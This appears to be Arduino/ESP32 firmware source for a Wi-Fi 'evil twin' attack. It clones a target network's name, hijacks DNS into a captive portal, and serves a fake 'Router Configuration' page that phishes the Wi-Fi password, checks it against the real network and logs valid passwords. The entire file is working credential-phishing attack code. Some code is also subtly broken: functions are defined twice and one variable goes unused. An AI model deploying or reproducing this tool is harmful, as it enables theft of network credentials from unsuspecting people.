#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "evil_twin.h"
#include "definitions.h"

DNSServer dnsServer;
WebServer etServer(80);
bool evil_twin_running = false;
int captured_credentials_count = 0;
int target_channel = 1;
String target_ssid = "";
uint8_t target_bssid[6];

bool validate_password(const String& ssid, const String& password) {
  WiFi.disconnect();
  delay(100);
  
#ifdef SERIAL_DEBUG
  Serial.println("Validating password for: " + ssid);
#endif
  
  WiFi.begin(ssid.c_str(), password.c_str());
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    attempts++;
  }
  
  bool success = (WiFi.status() == WL_CONNECTED);
  
#ifdef SERIAL_DEBUG
  Serial.println("Validation " + String(success ? "SUCCESS" : "FAILED"));
#endif
  
  WiFi.disconnect();
  delay(100);
  
  return success;
}

const char login_page[] PROGMEM = R"rawl(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Configuration</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #e8e8e8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo svg {
            width: 60px;
            height: 60px;
            fill: #1a73e8;
        }
        h1 {
            text-align: center;
            font-size: 24px;
            color: #333;
            margin-bottom: 10px;
        }
        .subtitle {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 14px;
            color: #555;
            margin-bottom: 8px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #1a73e8;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #1557b0;
        }
        .warning {
            margin-top: 20px;
            padding: 12px;
            background: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            font-size: 12px;
            color: #856404;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
        </div>
        <h1>$SSID</h1>
        <p class="subtitle">Enter your WiFi password to connect</p>
        <form method="POST" action="/login">
            <div class="input-group">
                <label>Network Password</label>
                <input type="password" name="password" placeholder="WiFi Password" required>
            </div>
            <button type="submit" class="btn">Connect</button>
        </form>
        <div class="warning">
            Unable to connect? Reboot your router and try again
        </div>
    </div>
</body>
</html>
)rawl";

void handle_root() {
  String page = login_page;
  page.replace("$SSID", target_ssid);
  etServer.send(200, "text/html", page);
}

void handle_login() {
  String password = etServer.arg("password");
  
  captured_credentials_count++;
  
#ifdef SERIAL_DEBUG
  Serial.println("=== ATTEMPT #" + String(captured_credentials_count) + " ===");
  Serial.println("Target: " + target_ssid);
  Serial.println("Password attempt: " + password);
#endif

  bool is_valid = validate_password(target_ssid, password);
  
  if (is_valid) {
#ifdef SERIAL_DEBUG
    Serial.println(">>> PASSWORD VALID! <<<");
    Serial.println("SSID: " + target_ssid);
    Serial.println("PASS: " + password);
    Serial.println("=====================");
#endif

    String save_string = target_ssid + "|" + password + "\n";
    
    String html = R"rawl(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #4CAF50;
        }
        .box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            max-width: 400px;
        }
        h1 { color: #4CAF50; margin-bottom: 10px; }
        p { color: #666; }
        .icon { font-size: 48px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="icon">✓</div>
        <h1>Connected!</h1>
        <p>You are now connected to the internet.</p>
    </div>
</body>
</html>
)rawl";
    etServer.send(200, "text/html", html);
    return;
  }

  String html = R"rawl(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #f44336;
        }
        .box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
        }
        h1 { color: #f44336; }
        p { color: #666; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Wrong Password</h1>
        <p>Please try again.</p>
    </div>
</body>
</html>
)rawl";
  etServer.send(200, "text/html", html);
}

void start_evil_twin(int target_network, const String& fake_ssid, const String& fake_pass) {
  if (target_network >= WiFi.scanNetworks()) {
#ifdef SERIAL_DEBUG
    Serial.println("Invalid target network");
#endif
    return;
  }

  target_channel = WiFi.channel(target_network);
  target_ssid = WiFi.SSID(target_network);
  memcpy(target_bssid, WiFi.BSSID(target_network), 6);
  
#ifdef LED
  set_led_state(LED_STATE_EVIL_TWIN);
#endif

#ifdef SERIAL_DEBUG
  Serial.println("=== STARTING EVIL TWIN ===");
  Serial.println("Target SSID: " + target_ssid);
  Serial.println("Target BSSID: " + WiFi.BSSIDstr(target_network));
  Serial.println("Channel: " + String(target_channel));
  Serial.println("Fake AP: " + fake_ssid);
  Serial.println("=====================");
#endif

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(fake_ssid.c_str(), fake_pass.c_str(), target_channel);
  
  delay(100);
  
  dnsServer.setTTL(30);
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  etServer.on("/", handle_root);
  etServer.on("/login", HTTP_POST, handle_login);
  etServer.on("/generate_204", handle_captive_portal);
  etServer.on("/fwc Up", handle_captive_portal);
  etServer.on("/redirect", handle_captive_portal);
  etServer.begin();
  
  evil_twin_running = true;
  
#ifdef SERIAL_DEBUG
  Serial.println("Evil Twin AP running!");
  Serial.println("IP: " + WiFi.softAPIP().toString());
#endif
}

void handle_captive_portal() {
  etServer.sendHeader("Location", String("http://") + etServer.client().localIP().toString() + "/");
  etServer.send(302);
}

bool is_evil_twin_active() {
  return evil_twin_running;
}

void handle_evil_twin_client() {
  if (evil_twin_running) {
    dnsServer.processNextRequest();
    etServer.handleClient();
  }
}

void stop_evil_twin() {
  evil_twin_running = false;
  dnsServer.stop();
  etServer.stop();
  WiFi.softAPdisconnect();
  WiFi.disconnect();
  
#ifdef LED
  set_led_state(LED_STATE_SUCCESS);
#endif
  
#ifdef SERIAL_DEBUG
  Serial.println("=== EVIL TWIN STOPPED ===");
  Serial.println("Total attempts: " + String(captured_credentials_count));
  Serial.println("=====================");
#endif
}

bool is_evil_twin_active() {
  return evil_twin_running;
}

void handle_evil_twin_client() {
  if (evil_twin_running) {
    dnsServer.processNextRequest();
    etServer.handleClient();
  }
}